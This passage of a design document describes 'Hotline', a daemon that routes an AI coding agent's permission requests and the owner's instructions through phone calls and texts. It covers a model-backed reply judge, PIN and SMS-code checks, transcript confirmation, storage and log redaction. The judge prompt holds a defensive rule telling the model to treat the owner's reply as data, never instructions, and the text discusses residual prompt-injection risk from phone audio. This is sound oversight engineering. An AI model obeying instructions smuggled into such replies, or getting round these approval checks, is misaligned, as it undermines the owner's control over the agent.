      the other steps, judged, and the checks applied in turn again, so a slow
      judge never holds a `submit_answer` on another call (such as a PIN-verified
      inbound call), an owner's text or a tick. A held answer that changed
      while the judge ran is checked again by the fast path alone.

    **The model-backed judge (HL-09d, `reply-judge.ts`).** A plan change at
    the owner's direction: the reply goes to the owner's own agent provider,
    on the plan the owner already pays for. `runDaemon` picks the judge once
    at start (`selectReplyJudge`), logs it (`reply judge`, with the backend
    and why) and records the backend in the `daemon.started` audit entry.
    Until the owner has chosen (`judge.backend` unset; `hotline init` asks
    once or takes `--judge`) it is `FailClosedJudge`: nothing is looked up,
    run or sent. With `judge.backend: "auto"` it takes the first available
    of:
    1. **Claude Code CLI** (`claude` on the PATH), on the owner's login:
       `claude -p --output-format json --model haiku --no-session-persistence
       --settings '{"disableAllHooks":true}' --strict-mcp-config --mcp-config
       '{"mcpServers":{}}' --tools "" --system-prompt <one line>`. `--bare`
       cannot be used: it never reads the OAuth login.
    2. **Codex CLI** (`codex` on the PATH), on the owner's login: `codex exec
       --ephemeral --ignore-user-config --ignore-rules --sandbox read-only
       --skip-git-repo-check --output-schema <file> --output-last-message
       <file> --color never -c model_reasoning_effort="low" -`, with Codex's
       default model.
    3. **Anthropic API**, when the optional `anthropic.apiKey` secret is set
       (`HOTLINE_ANTHROPIC_API_KEY` at `hotline init`): `POST /v1/messages`
       with `claude-haiku-5-5`, low effort and a JSON-schema output format,
       through the daemon's `fetch`. The key is added to the redactor.
    4. **None**: `FailClosedJudge`; such a reply is texted.

    `judge.backend` can also name one backend (`claude-code`, `codex`,
    `anthropic-api`; none when it is not available) or be `off`, which sends
    nothing anywhere. A CLI counts as available when it is an executable on
    the PATH: nothing is run to find out, so neither the daemon nor `hotline
    doctor` calls a model at start. Each CLI run happens in a fresh, empty
    temporary directory (removed afterwards; Codex's schema and answer files
    sit in a second one), with an allowlisted environment (`judgeChildEnv`:
    `JUDGE_BASE_ENV`, that is `PATH`, `HOME`, user, locale, XDG and proxy
    variables, plus the CLI's own login variables, `CLAUDE_CODE_LOGIN_ENV` or
    `CODEX_LOGIN_ENV`; never a `HOTLINE_*` variable) and `HOTLINE_JUDGE=1`, the
    prompt on stdin (the owner's words never appear in a process's
    arguments) and SIGTERM after `JUDGE_TIMEOUT_MS`; a CLI that ignores it
    gets SIGKILL `JUDGE_KILL_GRACE_MS` (2 s) later, and the run settles then
    as a failure whatever the process does, so a stuck CLI never holds the
    post-call webhook, `doctor --check-judge` or the temporary directories.
    The answer must have exactly the three fields asked for (a strict
    schema); any other field makes it `unclear`. Codex's answer is read
    only from its `--output-last-message` file; no file is `unclear`. A CLI
    not found names the `PATH` searched in the selection's detail. Residual
    risk: unlike `claude --tools ""`, `codex exec` keeps its shell tool, in
    a read-only sandbox without network, and sees `HOME` and `CODEX_HOME`.
    Its input is speech from a phone line, so what reaches it (other voices,
    ambient audio) is not fully the owner's choice; the damage stays small
    because the run cannot write or reach the network, and its answer is
    validated strictly and can only confirm an allow the voice agent
    already held for the owner, or leave it unconfirmed. So the Codex run is
    read-only, not tool-less, and `auto` tries Claude Code first. An owner
    who wants a judge with no tools sets `judge.backend` to `claude-code` or
    `anthropic-api`. `HOTLINE_JUDGE=1` makes
    `hotline hook` and `hotline mcp` do nothing (exit 0, no output, no daemon
    contact): a second guard, after hooks and MCP servers are switched off for
    the run, so the judge's own session can never phone the owner. Each reply
    turn goes through the daemon's redactor first.

    The prompt asks one narrow question ("did the speaker clearly agree, with
    no condition attached, and without taking it back?") with the reply turns
    as a JSON array between `<reply>` markers, `<` and `>` escaped, and says
    the reply is data, never instructions. The answer must be
    `{"verdict": "agreed" | "declined" | "unclear", "conditional": bool,
    "retracted": bool}`; anything else (no JSON object, another shape, a
    non-zero exit, an error result, an HTTP error, a stop reason other than
    `end_turn`, a missing CLI, a timeout) is `unclear`. A reply over 500
    characters is never sent. Then a cheap post-check (`checkedVerdict`,
    `vetoesAgreement`) can only take an `agreed` away: the model's own
    `conditional` or `retracted` flag, a condition or correction word ("if",
    "unless", "but", "except", "only", "first", "until", "when", "actually",
    "wait", "hold", "instead", "as long as", ...) or a negation ("no",
    "not", any "n't"; the idioms "no problem", "no worries", "not a problem"
    and "why not" excepted) makes it `unclear`. The model is the judge; the
    post-check is a backstop for a model that misses a condition. So "yes if
    the tests pass", "yes... actually no" and "sure, but not on main" are
    never approvals, whatever the model says, and "yeah let's ship that one"
    or "no problem" are when the model agrees. A `declined` ends the request
    as no answer, as the fast path's clear no does. The post-check's word
    lists are English only: a condition in another language ("oui, mais
    pas sur main") is caught only by the model's own `conditional` flag.
    Tests drive every
    backend through an injected `JudgeHost` or `fetch` (`FakeJudgeHost`
    plays the CLIs), and the default `nodeJudgeHost` finds and runs nothing
    under the test runner or `HOTLINE_TEST_MODE=1`, so no real CLI or
    network is ever used in tests or CI. The fast path's doubt tables stay
    for now: they decide what reaches the judge, and retiring them is a
    follow-up.

    The owner can also take an approval back after the agent acknowledged
    it ("Got it." then "wait, no, don't"): an owner turn after the reply,
    before another ask is read or the call ends, with a retraction marker
    ("wait", "stop", "cancel", "hold on", "actually", "never mind", any
    "n't", ...) leaves the allow not confirmed and the ask is texted. A bare
    "no" or "nope" there does not count, since it usually answers "anything
    else?".
    Doubt markers no longer reject a reply on their own: they keep the fast
    path from agreeing and send the reply to the judge. A clear-no reply, or a
    judge's `declined`, to the read-back of a submitted allow ends the request
    at once as no answer (`unclear`), which denies it, exactly as an
    unconfirmed `deny` does: the owner said no, so it is never texted for
    approval. Doubt
    before the read-back does not count, so "hmm", then "Sorry, is that a yes
    or a no? Allow ...? Yes?", then "yeah go ahead" agrees, and so does "no",
    a read-back, then "okay yes" (a deny the voice agent submitted for the
    "no" still wins, see above). No read-back, a read-back of a different ask,
    a read-back with no reply, or a statement repeating the request ("Okay,
    it will run pnpm test.") is no approval: the ask stays open and is
    texted. The voice model's own judgement still decides whether to submit
    the allow; the daemon only refuses one the transcript does not back.
  "Sounds doubtful" (`soundsDoubtful`) means refusal, negation, hesitation,
  delay or correction: words such as `no`, `not`, `never`, `wait`, `hold`,
  `later`, `maybe`, `but`, `cancel`, `abort`, `negative`, `cannot`, `actually`,
  any `n't` (apostrophe look-alikes such as `’`, `ʼ`, `` ` ``, `´` and `′` are
  normalised first) and the same forms typed without it (`dont`, `wouldnt`,
  `cant`, ...), hedges and conditions (`unsure`, `whether`, `if`, `probably`,
  `think`, `suppose`, `hmm`, `hm`, `kinda`, `whatever`, `meh`, ...), not having
  heard (`huh`, `pardon`, `hello`, `repeat`), refusals without a "no" (`skip`,
  `decline`, `pass`, `block`, `veto`, `rather`, ...), the phrases "hang on",
  "hold on", "not yet", "no way", "never mind", "uh uh" and "uh oh", and
  questions (a `?`, or `what`, `why`, `how`, `which`, ..., since speech
  recognition often drops the question mark). "Mm-hmm", "uh-huh" and "mhm",
  written as one hyphenated sound, are a yes, not a "hmm" or "huh"; "mm,
  hmm" is a hesitation. Common refusals in other languages (`nein`, `nee`,
  `nej`, `niet`, `nie`, `non`, `não`, `nada`) count too. For free text,
  options and `done`, a question asked before the owner's answer ("what does
  it push?") does not count against it; one in the answer itself or after it
  does. For an `allow`, doubt only keeps the fast path from agreeing (above):
  idioms that carry a negation word ("no problem", "why not") go to the
  judge.
  A `deny` needs only the owner's words in a window; nothing else can block a
  refusal. The stored `ownerExcerpt` is the matching owner turns, verbatim, not
  the model's `owner_words`. An unconfirmed answer is dropped
  (`voice.answer-unconfirmed`): an unconfirmed `allow` or other answer leaves
  the ask open (no answer from the call; call policy texts it), while an
  unconfirmed `deny` still ends a permission request at once as no answer
  (`unclear`), which denies it, and it is never sent out again for approval.
  The agent then sees `no-answer` with reason `unclear`, not a recorded `deny`.
  Confirmed answers and `unclear` reports reach the queue before the call's
  `call-ended`.
  Known limits: the word lists are English, so other languages never confirm
  an option or `done`, and never get a fast yes for an allow (fail closed:
  the ask is texted). A doubtful
  word in a later turn about the ask also takes back a free-text answer. These
  rules are tested on scripted transcripts only; real ElevenLabs transcripts
  (turn splitting, interruptions, paraphrased readings) need the live check, and
  some answers will be refused there until the persona is tuned. Without a
  judge backend (or with `judge.backend: "off"`), any natural yes outside the
  fast path's table is texted rather than approved. With one, its verdict on
  the owner's words (and the post-check) is what stands between a voice model
  that submits an allow on its own and an approval. The judge prompt and
  post-check are tested against a scripted model only; how well a real model
  judges real replies needs the live check. High-risk requests still need the
  PIN.
- **How a call ended.** `call_initiation_failure` `busy` or `no-answer` is
  `no-pickup`, anything else `failed`. A transcription in which the owner never
  spoke is `no-pickup` (voicemail, silence); one where every ask was settled is
  `answered`; otherwise `dropped`. The call log (`call.ended` audit `result`)
  says `owner-unclear` instead of `dropped` when every ask left open was read,
  asked again (a read-back, "is that a yes or a no?", or a re-reading), and
  the owner replied after at least two of those readings, but no decision for
  it was confirmed (the owner stayed unclear and the voice agent moved on to a
  text, or the answer was not confirmed); each such ask gets a
  `voice.ask-unclear` audit entry. One reply to one reading, then a hang-up,
  stays `dropped`. The queue
  still gets `dropped`, so those asks are texted at once, and an unanswered
  text still expires with reason `dropped`: the core contract has no reason for
  an owner who stayed unclear yet. Its `CallRecord.outcome` is `answered`
  (the owner picked up). A call whose post-call event never arrives is
  given up on after 15 minutes, its held answers discarded: no answer. Each
  ended call is stored as a `CallRecord` with its duration and a rough cost
  estimate (12 US cents a minute).
- **Texts.** `send-text` sends one ask through the SMS provider. Every
  permission request, low risk included, carries a random 6-digit code ("Reply
  YES 123456 to allow, or NO to deny", with "HIGH RISK." first for a high-risk
  one), unique among waiting codes and one the redactor leaves intact. No text
  approves a request without its code (`smsAnswer`), so an old or replayed
  "yes" can never approve a newer request. Only a salted scrypt hash of each
  code is stored with the state (`code-hash.ts`, HL-13a: a fresh 16-byte salt
  per code, N = 2^14), and a reply's code is compared with each waiting hash in
  constant time, so the code cannot be read back from the database. Hashing
  and comparing run on libuv's thread pool (async `scrypt`), so a text with
  several waiting codes does not stall webhooks or agent polls; only migrating
  plaintext codes on start hashes synchronously. Codes die
  with the ask and are spent on first use; a code that matches no waiting ask
  burns every waiting code, so those requests can then only be approved on a
  call. A text sent again (after a crash part way through a send) carries a
  fresh code that replaces the old one, since the old one cannot be read back;
  a code from the interrupted text then no longer works. State saved before
  HL-13a with plaintext codes is hashed on start. Without a usable code the
  text says the request can only be approved on a call. Code hashes and held
  voice answers (with the model's `owner_words`) live in `daemon_state`, inside
  the `0600` database the store already requires, which zeroes overwritten rows
  (`secure_delete`); same-user processes can read it (see
  [contracts](contracts.md#secrets-secretsts)). A hash of a 6-digit code can
  still be brute-forced offline in hours of CPU time; what stops a forged
  `YES <code>` is the pull from Twilio above, which a forger cannot satisfy.
- **Text replies** (`owner-texts.ts` plans, the orchestrator applies). Each
  owner text is handled once per message SID, also across restarts
  (`inbound_messages`). The SID is recorded before the text has any effect, so a
  redelivery after a crash part way through can never apply the same words
  again, say to a different waiting ask. A failure after that loses the text
  (no answer), and the owner is told: a step that fails replies "your text was
  not recorded, please send it again", and texts a crash interrupted (claimed
  but never finished) get one text on the next start saying a text may not
  have been recorded. `call me` becomes the queue's `call-me`
  event and gets "calling you now" or the queue's reason for not calling.
  `status` gets the [inbound line](#inbound-line)'s status of every live
  session; `stop` and Twilio's keywords get no reply of Hotline's own. Any other text answers only an ask Hotline texted that is
  still open, and only one: a `YES <code>` reply names the ask with that code;
  otherwise there must be exactly one such ask, texted at least 10 seconds
  before the message was first seen (the earlier of the time its SID was
  claimed and Twilio's own `date_created` for it, so a text whose webhook comes
  late or is replayed keeps the time it was written; an ask with no recorded
  send time never qualifies). A reply that predates the text, or
  came too quickly to answer it (a stray reply meant for something earlier),
  is not used, and the owner is asked to read the text and reply again. So a
  free-text answer or a "no" can never land on a question or request texted
  after it was written. With several waiting the reply
  answers nothing and the owner is told to text `call me`. `smsAnswer` then
  turns the text into an answer, which goes through the queue and
  `recordAnswer`.
- **Resolving.** An `answered` outcome is stored with `recordAnswer`, which
  checks `answerProblem` again; nothing else marks an ask answered. If the
  store refuses it, the ask is closed at once as no answer (`failed`), and the
  owner's text reply says it was not recorded. A no-answer
  closes the ask (`expired` or `cancelled`) with its specific reason
  (`no-pickup`, `dropped`, `failed`, `unclear`, `timeout`, `cancelled`), which
  the outcome route reports. A delivered notification is closed as `expired`
  with the reason `delivered` (its outcome still reads `no-answer`).
- **No grace period at expiry.** An ask expires at `expiresAt` even in the
  middle of a call; a voice answer still held then (its post-call event not in
  yet) does not count. The agent's wait stays bounded.
- **Providers.** `runDaemon` builds `TwilioSmsProvider` (with `sms.fromNumber`
  and both Twilio secrets) and `ElevenLabsVoiceProvider` (with `voice.agentId`,
  `voice.agentPhoneNumberId` and the `elevenlabs.apiKey` secret) with
  `globalThis.fetch` and the daemon's redactor, and logs `outbound calls off` or
  `outbound texts off` with the reason when one is missing. Then every call or
  text fails and the queue falls back or ends the ask as no answer.

## Inbound line

`InboundLine` (`inbound-line.ts`, HL-10, plan section 4D) serves the owner
calling the Hotline number or texting `status`. The routes above have already
checked the tool secret, that the owner's number is on the call, and that this
call passed `verify_pin`; before that nothing is read out and nothing is taken
(`pin-required`), so a caller spoofing the owner's number still needs the PIN.
Anyone else's call gets `refused` with `end_call` on its first tool call, and
anyone else's text the generic SMS reply.

- **Status.** `get_status` numbers every live session, oldest registration
  first, and remembers on this call which number is which session. Numbers
  are stable for the whole call: on a later status a session keeps its
  number, a new one gets the next unused number, and an ended one's number
  is never reused. Per
  session: its spoken name, state, open asks by kind, the latest ask's text
  (already redacted when it was stored, redacted again and cut to 120
  characters), queued instructions, and when it was last heard from. The name
  and the ask text are agent-derived, so they are fenced in `<agent_text>` like
  ask text on outbound calls. The whole status stays under 1400 characters;
  sessions past that are counted ("3 more sessions are not read out") and
  cannot be given instructions on that call, since only the numbers read out
  are remembered. Open asks are counted from all of a session's open asks;
  the latest text is its newest ask's. Stale
  sessions are ended first ([session lifetime](#session-lifetime)). The `status`
  text gets the same status with state and counts only: no agent-written ask
  text goes to Twilio. It goes back only to the owner's
  number (the webhook checked the sender, and Twilio replies to that number), so
  a spoofed sender never sees it.
- **Instructions are held, then confirmed.** `send_instruction` takes only a
  session number that this call's status read out and a session still live;
  then it holds the instruction (`queued`) until the post-call transcript. Caps:
  5 per call, 3 waiting per session, 20 in all (`too-many`). At the post-call
  event each held instruction must pass `confirmInstruction`
  (`instruction-confirm.ts`):
  - the owner's utterance (one stretch of owner turns between two agent turns;
    on an inbound call only turns after the PIN are the owner's, and a stretch
    with anyone else's turn never counts) is the instruction and nothing else:
    the instruction's words in order, preceded at most by a session reference
    ("session two", "tell Codex to", "the second one") and filler, followed at
    most by filler ("thanks"). So "don't push to main" never confirms "push to
    main", a qualifier after it is never dropped, and every word of the
    instruction comes from the owner's own turns, never from the status or a
    read-back. Session names come from agent folders, so a name word counts
    as reference only when the owner named the session by name, never once
    they gave a number ("session one, push to main" never confirms "to main"
    for a session named "push"), and never a word of the instruction.
    `owner_words` must be the owner's words in that utterance;
  - exactly one session is identified in that reference (or, when it has none,
    in an owner stretch just before that is only a session reference): by
    "session N" or "number N", an ordinal, a bare digit, or a name matching it
    better than any other listed session. Words inside the instruction never
    name a session ("in session one, add test two" names session 1 only). Two
    identifiers, or none with more than one session listed, mean not
    confirmed;
  - the agent's next turn is the read-back the prompt asks for ("For session
    2, Codex in api: rebase on main. Send it?"): it names "session <n>" for
    that session and repeats the instruction's words, and the owner's reply is
    a clear yes (a yes word, nothing doubtful, no question, no retraction);
  - for the rest of the call after that yes, no owner turn holds a retraction
    ("never mind", "cancel that", "forget about it", "don't send", "hold
    off"), a doubt marker or a bare negation ("no", "don't", "stop", "wait";
    `soundsDoubtful` without counting questions). The one exception is a turn
    that is itself the utterance of another instruction confirmed on its own
    (`confirmInstructions` judges all of a call's instructions together,
    repeating until nothing changes), and never a turn with a retraction. This
    over-blocks on purpose: "no, that's all" drops it too, and the owner can
    say it again or text it.
  What is queued is never the model's `instruction` text: it is the owner's
  own words for exactly the validated tokens, cut from the transcript (the
  utterance minus its session reference and filler), with invisible
  characters removed. After redaction it may hold only letters, digits, spaces
  and plain punctuation (`plainInstruction`); one with any other symbol ("use
  C++", "delete /tmp/x") is refused and the owner texted, never queued with
  the symbol stripped. The read-back reply is judged by
  a fixed yes lexicon and fails closed; HL-09c's reply judge can replace it
  later.
  Every comparison uses one tokeniser, `speechTokens` in `@hotline/providers`
  (NFKC, lower case, apostrophe look-alikes, combining marks dropped), shared
  with `ownerSaid` and `voice-confirm.ts`, so curly apostrophes, fullwidth
  letters and stray marks compare the same in every check. Numbers on calls
  and texts are compared with `sameE164`: both sides must be valid E.164 and
  identical, with no digit stripping, so "15555550100" or "+1 555 555 0100" is
  someone else. The PIN is only ever checked through `verify_pin`; nothing in a
  transcript can stand for it.
  A confirmed instruction is redacted, cut to 1000 characters and stored
  (`instructions` table) with the owner's utterance as its excerpt and the
  conversation id, under an id fixed when it was held, so a retried post-call
  event stores it once. Anything else is dropped
  (`voice.instruction-unconfirmed` with the reason). After the call the owner
  gets one text either way, with counts only: that it was queued, or that it
  was not passed on (and how many others were queued), since the voice agent
  said `queued` before the transcript was checked. The held instructions and the call's
  numbering are kept for an hour, in memory and in the store (`inbound_calls`,
  HL-13b; the instruction and the owner's words redacted before they are
  saved). Past that without a post-call event they are dropped, audited
  (`no post-call event`) and the owner gets the same "not passed on" text.
  A restart keeps them: the next run loads them before any route serves, and
  the post-call event confirms them against the pulled transcript as usual
  (after a restart, against the redacted copy, so an instruction with a
  secret in it fails closed). On start, calls past their hour are dropped as
  above, and a saved call that does not read back is deleted, audited
  (`unreadable`) and texted about. A run before HL-13b saved only counts
  (`daemon_state` `inbound.held`); the first start after upgrading audits
  them (`restarted`) and texts the owner once. The Stop hook looks for
  instructions only with the agent's own session id, so it never registers a
  throwaway session to look.
- **Delivery.** Each instruction is handed over once, oldest first, to the
  session's next reader: the MCP server after `ask_human` returns (it adds
  them to the result), `check_inbox` (which reads the inbox, then acknowledges
  what it lists just before it returns), or the Stop hook, which
  takes them before it asks the owner anything and continues the agent with
  them (`decision: block`, one instruction per line) within the usual loop
  guards. A stop already waiting on the owner is cancelled when an instruction
  for its session is queued (`ask.cancelled` by `instruction`), and the hook
  then picks the instruction up. A permission request never carries one.
  An ended session's inbox and instruction routes answer `404`, so its client
  registers again (`check_inbox` retries once at once).
  Instructions are dropped when their session ends and after 6 hours unread,
  checked again at every hand-over
  (`instruction.expired`).
- **No answers on inbound calls.** Call orchestration accepts `submit_answer`
  only on a call Hotline placed, so an inbound call answers no ask, PIN or not.
  The plan's inbound line reads status and takes instructions only.
- **Lockouts.** `PinGate.onLockout` is audited (`voice.pin-lockout`) and texted
  to the owner, at most once an hour per direction, quiet hours or not. When
  each direction's text last went out is saved (`daemon_state`
  `inbound.lockout-texted-at`), so a restart allows no early second one.
- **Inbound call records.** Each inbound call's post-call event stores a
  `CallRecord` (direction `inbound`, no asks, `answered` when anything the
  person said counted as the owner's, else `rejected`) with its duration and
  cost estimate, for `hotline doctor`. No numbers are stored.
- Known limits: Codex's MCP server has no session id of its own, so its MCP
  session and its hooks' session are two sessions in the status; an
  instruction reaches whichever one the owner named. Name the hooks' session
  (it registered from a Stop or permission hook) to have the instruction
  picked up at the agent's next stop in away mode, or the MCP one to have it
  come back with its next `ask_human` or `check_inbox`. Not verified against
  real Claude Code or Codex. The read-back reply
  still uses the fixed yes lexicon; moving it to HL-09c's reply judge is a
  follow-up. Real transcripts may
  split or merge turns differently from the fake's; tune on the live check.

## Session lifetime

`sessions.ts`. The MCP server ends its session when it exits, but a killed
server never does, and hook sessions never end at all. Before a new session
registers and before each status is read, the daemon drops queued instructions
older than 6 hours, then ends every live session nobody has heard from
(`lastSeenAt`: registration, asks, inbox reads, instruction pickups) for 6
hours that has no open ask and no queued instruction (`session.expired`). Ending
a session cancels its open asks and drops its queued instructions, whoever ends
it. At most 20 sessions are live at once. At the cap, a new registration ends
the longest-idle live session that has no open ask and no queued instruction
and has been idle for 15 minutes (`session.evicted`), so killed agents cannot
lock registrations out for hours; when there is none it gets `429`
(`session.refused`), so a looping agent cannot flood the status or evict
sessions in use. An existing session can always refresh. A client whose
session was ended registers again on its next call.

## Store

SQLite through Node's built-in `node:sqlite`, at `hotline.db` in the hotline home,
mode `0600` in a `0700` directory. A new file is created `0600` before SQLite
opens it, so it never exists with umask permissions. A symlinked database, or one in a directory
other users can reach, is refused. Tables: `sessions`, `asks`, `answers`, `calls`
and `audit`. Each table keeps the record as JSON validated by the HL-02 schemas,
on write and on read, next to the columns the daemon queries by. Migration 3
(HL-09) adds `asks.end_reason` (why an ask ended without an answer, set by
`closeAsk`), `daemon_state` (call orchestration's saved state, as JSON) and
`inbound_messages` (the owner's texts claimed, by message SID, and whether each
was finished). Twilio signatures carry no timestamp, so a captured reply can be
replayed at any time: finished SIDs are kept for 400 days and unfinished ones
until they finish. Rows are tiny. Migration 4 (HL-10) adds `instructions`:
the owner's confirmed instructions with their session, status (`queued`,
`delivered`, `dropped`), how they were delivered or why they were dropped, and
the record (text, excerpt, conversation id) as JSON. `peekInstructions` lists a
session's queued ones (dropping expired ones in the same transaction), and
`ackInstructions` marks the given ids delivered in one transaction.
`addInstruction` is idempotent by id.
`onAskAdded` tells listeners about each new ask, as `onAskChange` does about
status changes. Migration 5 (HL-13b) adds what must survive a restart:
`pin_failures` (each wrong PIN's direction and time, for the PinGate's hourly
and daily budgets; older than a day is pruned), `inbound_calls` (the inbound
line's memory of a call: the session numbers its status read out and the
instructions it holds until the post-call event, the words redacted; deleted
once the event is handled or the call is forgotten) and `tool_deliveries`
(state-changing server-tool deliveries by hash, with the response each got,
for two hours). Times in these three are epoch milliseconds. The forgery
alarm's and the lockout text's last send times are in `daemon_state`.

- Migrations are an append-only list (`MIGRATIONS`). `PRAGMA user_version` counts
  how many have run. Each runs in its own transaction, so a failure leaves the
  version unchanged. A database from a newer Hotline is refused.
- `PRAGMA secure_delete` is on (HL-13a): overwritten and deleted rows are zeroed
  on disk, so replaced state does not linger in free pages.
- `recordAnswer(answer, receivedAt)` stores an answer and marks its ask
  `answered` in one transaction. It refuses anything `answerProblem` rejects
  (closed or expired ask, wrong decision kind, unconfirmed high-risk approval).
  The `answers` primary key stops a second answer. `answered` cannot be set any
  other way.
- The audit log is append-only: triggers abort any `UPDATE` or `DELETE`, and
  details are redacted before they are stored.
- `appendAudit(event, detail, at, { askId, sessionId, callId })` stores the ids
  an entry refers to in their own nullable columns (`ask_id`, `session_id`,
  `call_id`, migration 2). They are validated against core's `Id` and written as
  given, so `listAudit({ askId })` can find every entry for an ask. Only the
  free-text `detail` passes through the redactor, which stays fail-closed: it
  removes UUID-shaped values, so an id put in `detail` is stored as
  `[REDACTED]`. Pass ids as the typed parameter, never inside `detail`.
- Callers pass every time in (the injected clock); the store never reads the wall
  clock.

Node prints `ExperimentalWarning: SQLite is an experimental feature` once at
startup on Node 22 and 24. It is harmless.

## Logs

The contract for every caller (also at the top of `logger.ts`):

1. Log parsed, allowlisted fields only: ids, statuses, counts, method and path,
   and a reason. Never log raw bodies, headers, query strings, provider
   payloads, transcripts, ask text or anything an agent or caller wrote.
2. Request logs carry the method and path only.
3. The redactor below is a safety net, not the primary control. Code that relies
   on it to make a raw value safe to log is a bug.

JSON lines (pino, through Fastify) go to stderr. Fastify logs every request as it
arrives, before any token or signature check, so its request serializer is
replaced: those lines carry the method and path only, never the query string,
headers or body. Each line is also redacted just before it is written, so the
message, request fields, error stacks and bindings are all covered:

- Phone numbers become `***` plus their last four digits (`+15555550100` becomes
  `***0100`, `%2B`-encoded and national formats included, also right after a URL
  escape such as `%3D`). Any bare run of 10 to 15 digits is masked the same way,
  even inside a word or identifier, as are numeric values and object keys of
  that shape. pino's own `time` field is the one exception.
- Secrets are replaced with `[REDACTED]`: the daemon's own token and any other
  known secret value, `Bearer` credentials, `name=value` and JSON pairs whose name
  looks like a credential, PEM private keys, recognisable key formats (`sk_`,
  `ghp_`, AWS, Slack, Twilio `AC`/`SK` SIDs, JWTs), and any long run of letters and
  digits. The one exemption is a Twilio SID (`CA`, `SM`, `MM`, `PN` or `MG` plus
  exactly 32 hex digits). ElevenLabs ids and UUIDs are removed like any other
  long run.
- Values under keys such as `authorization`, `cookie`, `*token*`, `*secret*`,
  `*signature*`, `*api-key*`, `*pin*`, `*passcode*`, `*otp*` or Twilio's
  `Digits` (the owner's keypresses) are removed whatever they hold. The same names
  in `name=value` and JSON text lose their values too. Quoted values honour
  backslash escapes. An unterminated quote fails closed: the rest of the line is
  removed.
- Known secrets (8 characters or more) are also matched URL-encoded (upper- or
  lowercase escapes) and JSON-escaped.
- Form and URL parsers decode `%XX` and `+` before they read a name, so
  `Dig%69ts=1234` arrives as `Digits=1234`. Each segment (split on `&`, `;`, `?`,
  `#`, `,` and whitespace) that holds an escape or a `+` is also checked
  decoded. Malformed escapes decode byte by byte. If the decoded copy holds a
  secret assignment, credential, known secret or the PIN, the whole raw segment
  is removed, whatever the raw form looks like.
- The owner's PIN, which is shorter than that minimum, can be registered with
  `addShortSecret` (4 to 8 digits). Any digit run or formatted number that
  contains it anywhere is removed whole, before phone masking, so a masked number
  can never print the PIN as its last four digits. `verify_pin` registers the
  PIN this way once it verified; before that, the key-based redaction above is
  what protects it.
- Numbers are redacted like their decimal text: phone-shaped, equal to a known
  secret, or containing the PIN.
- Strings longer than 16 KiB are cut, along with the word at the cut, and
  marked `[truncated]`. The patterns are bounded, so redaction stays linear on
  long or hostile input.

## Shutdown

On the first SIGINT or SIGTERM the daemon writes `daemon.stopping` to the audit
log and stops both listeners. In-flight requests can finish; new ones get `503`.
On the agent API, waiting outcome requests return at once, and connections still
open after 2 seconds are closed.
It then closes the database and exits 0. If requests are still running after
10 seconds, it gives up and exits 1. A second signal during shutdown gets Node's
default handling, which ends the process at once.
